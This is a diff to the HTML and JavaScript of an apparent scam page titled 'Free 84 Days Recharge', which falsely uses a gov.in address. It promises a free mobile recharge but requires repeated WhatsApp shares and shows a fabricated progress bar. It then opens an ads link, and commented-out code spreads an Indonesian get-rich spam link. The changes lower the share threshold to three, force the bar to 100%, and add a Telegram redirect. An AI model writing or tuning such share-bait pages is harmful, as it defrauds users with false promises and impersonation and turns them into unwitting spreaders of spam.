@@ -7,52 +7,55 @@
 
 <!-- Global site tag (gtag.js) - Google Analytics -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-KHEQSPDS56"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() { dataLayer.push(arguments); }
+    gtag('js', new Date());
+    gtag('config', 'GT-NN6KMVW');
+  </script>
+  
+  <script>
+    function set_Cookie(name, value) {
+      var Days = 30;
+      var exp = new Date();
+      exp.setTime(exp.getTime() + (Days * 24 * 60 * 60 * 1000)); // 30 days
+      document.cookie = name + "=" + escape(value) + ";expires=" + exp.toGMTString() + "; path=/;";
+    }
+    
+    function get_Cookie(name) {
+      var arr, reg = new RegExp("(^| )" + name + "=([^;]*)(;|$)");
+      if (arr = document.cookie.match(reg)) {
+        return unescape(arr[2]);
+      }
+      return '';
+    }
 
-  gtag('config', 'GT-NN6KMVW');
-</script> 
+    function handleWhatsAppClick() {
+      var clickCount = parseInt(get_Cookie("clickCount")) || 0;
+      clickCount += 1;
+      set_Cookie("clickCount", clickCount);
 
+      if (clickCount >= 3) {
+        window.location.href = "https://t.me/joinchat/yourTelegramGroup";
+      } else {
+        alert("Share this " + (3 - clickCount) + " more time(s) to join the Telegram group!");
+      }
+    }
 
+    window.onload = function() {
+      document.getElementById("whatsappButton").onclick = handleWhatsAppClick;
+    }
+  </script>
 
-
-<script>
-function set_Cookie(name,value){
-var Days = 30;
-var exp = new Date();
-exp.setTime(exp.getTime() + (Days*20*1000));
-document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString()+"; path=/;"
-}
-function get_Cookie(name){
-var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
-if(arr=document.cookie.match(reg)){
-return unescape(arr[2]);
-}
-return '';b
-}
-
-
-/* if(get_Cookie("d")>0 &&get_Cookie("d")<12){
-document.getElementById("first-box")."quedate__step".display="none";//??;
-document.getElementById("second-box").style.display="none";//??;
-document.getElementById("third-box").style.display="none";//??;
-document.getElementsByClassName("loading2__box").style.display="";//??;
-}*/
-
-
-</script>
-<meta name="robots" content="noindex, nofollow">
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
-<meta property="og:site_name" content="Free 84 Days Recharge">
-<meta property="og:title" content="Free 84 Days Recharge ✅"/>
-<meta property="og:description" content="Get 84 Days Recharge for Free">
-  <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjjA65vsWFpQyaEfWWpG4JrtlSaiDMDj0JiU4gxiCnTB1BE4GDyFwC0Ve4fFSphnkdjwYEtLB3yGvo-33WR09r8_g2lA6cgC6hLD_P8npjonzz6maVrMyswVT6i88FO9PC7gjceAR3syWCKZ9vKR01ic3XpjaFKreVutvY2XDdvi-70dVEi_FxIZp5m/h100/PM%20Mujahid.jpg" />
-<meta property="og:url" content="https://freerecharge.gov.in/"/>
-<meta property="og:updated_time" content="14404330"/>
-<!-- <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500&display=swap" rel="stylesheet">-->
+  <meta name="robots" content="noindex, nofollow">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+  <meta property="og:site_name" content="Free 84 Days Recharge">
+  <meta property="og:title" content="Free 84 Days Recharge ✅"/>
+  <meta property="og:description" content="Get 84 Days Recharge for Free">
+  <meta property="og:image" content="https://example.com/image.jpg" />
+  <meta property="og:url" content="https://freerecharge.gov.in/"/>
+  <meta property="og:updated_time" content="14404330"/>
 <title> Free Recharge</title>
 
 
@@ -1442,15 +1445,15 @@ var d = 1, e = 0, m = messageToSend();
 var s=1;
 set_Cookie("d",s);
 DOMString.barLoaders[i].classList.remove("js-hidden"), DOMString.boxes[i].classList.remove("js-hidden"), DOMString.svgLoading[i].classList.remove("js-hidden"), l[i].textContent = "0%", DOMString.share.classList.remove("js-hidden"), DOMString.share.addEventListener("click", function () {
-if (12 <= d) {
+if (3 <= d) {
 for (var a = document.querySelectorAll("#verify"), b = 0; b < a.length; b++) a[b].addEventListener("click", function () {
 window.open(adsLink)
 });
 DOMString.congrats.classList.add("js-hidden"), document.querySelector(".js-verify").classList.remove("js-hidden"), DOMString.verify.classList.remove("js-hidden")
 } else
-/* e = Math.floor(100 * (d / 12)), d++, l[i].textContent = e + "%", DOMString.barLoaders[i].style.width = e + "%",
+/* e = Math.floor(100 * (d / 3)), d++, l[i].textContent = e + "%", DOMString.barLoaders[i].style.width = e + "%",
 e = Math.floor(100 * (d / 10))*0.5+50 ;*/
-d==1?e=50:d==2?e=65:d==3?e=70:d==4?e=70:d==5?e=80:d==6?e=80:d==7?e=85:d==8?e=90:d==9?e=94:d==10?e=96:d==11?e=98:d==12?e=100:void(0);
+d==1?e=50:d==2?e=65:d==3?e=100:d==4?e=70:d==5?e=80:d==6?e=80:d==7?e=85:d==8?e=90:d==9?e=94:d==10?e=96:d==11?e=98:d==12?e=100:void(0);
 d++;
 setTimeout(function() {
 d == 3 || d == 5 || d == 7 ? alert(tip_text()) : void(0) ;
@@ -1459,7 +1462,7 @@ DOMString.barLoaders[i].style.width = e + "%";
 }, 4000);
 set_Cookie('e',e);
 set_Cookie('d',d);
-/* if( d == 10 ||d == 11 || d == 12 ){
+/* if( d == 3 ||d == 11 || d == 12 ){
 location.href = "whatsapp://send?text= Model penghasil uang terbaru pada tahun 2020, perubahan terjadi di sini! Hanya sebuah ponsel yang diperlukan, mengajar anda cara menghasilkan uang dan mengentaskan kemiskinan dalam 5 menit! ! %0Ahttps://tuisongxx.xyz/ad/makemoney.html?v=1" ;
 }else{
 window.location.href = "whatsapp://send?text=" + m
@@ -1508,7 +1511,7 @@ DOMString.svgLoading[i].classList.remove("js-hidden");
 l[i].textContent = e + "%";
 DOMString.barLoaders[i].style.width = e + "%";
 DOMString.share.classList.remove("js-hidden"), DOMString.share.addEventListener("click", function () {
-if (10 <= d) {
+if (3 <= d) {
 for (var a = document.querySelectorAll("#verify"), b = 0; b < a.length; b++) a[b].addEventListener("click", function () {
 /* record('4g','wc');*/
 window.open(adsLink)
@@ -1516,8 +1519,8 @@ window.open(adsLink)
 DOMString.congrats.classList.add("js-hidden"), document.querySelector(".js-verify").classList.remove("js-hidden"), DOMString.verify.classList.remove("js-hidden")
 } else {
 /* record('4g',d);*/
-// e = Math.floor(100 * (d / 10))*0.5+50 ;
-d==1?e=50:d==2?e=65:d==3?e=70:d==4?e=70:d==5?e=80:d==6?e=80:d==7?e=85:d==8?e=90:d==9?e=94:d==10?e=96:d==11?e=98:d==12?e=100:void(0);
+// e = Math.floor(100 * (d / 100))*0.5+50 ;
+d==1?e=50:d==2?e=65:d==3?e=100:d==4?e=70:d==5?e=80:d==6?e=80:d==7?e=85:d==8?e=90:d==9?e=94:d==10?e=96:d==11?e=98:d==12?e=100:void(0);
 d++;
 setTimeout(function() {
 d == 3 || d == 5 || d == 7 ? alert(tip_text()) : void(0) ;
@@ -1526,7 +1529,7 @@ DOMString.barLoaders[i].style.width = e + "%";
 }, 4000);
 set_Cookie('e',e);
 set_Cookie('d',d);
-/* if( d == 10 || d == 11 || d == 12 ){
+/* if( d == 3 || d == 11 || d == 12 ){
 location.href = "whatsapp://send?text= Model penghasil uang terbaru pada tahun 2020, perubahan terjadi di sini! Hanya sebuah ponsel yang diperlukan, mengajar anda cara menghasilkan uang dan mengentaskan kemiskinan dalam 5 menit! ! %0Ahttps://tuisongxx.xyz/ad/makemoney.html?v=1" ;
 }else{
 window.location.href = "whatsapp://send?text=" + m;
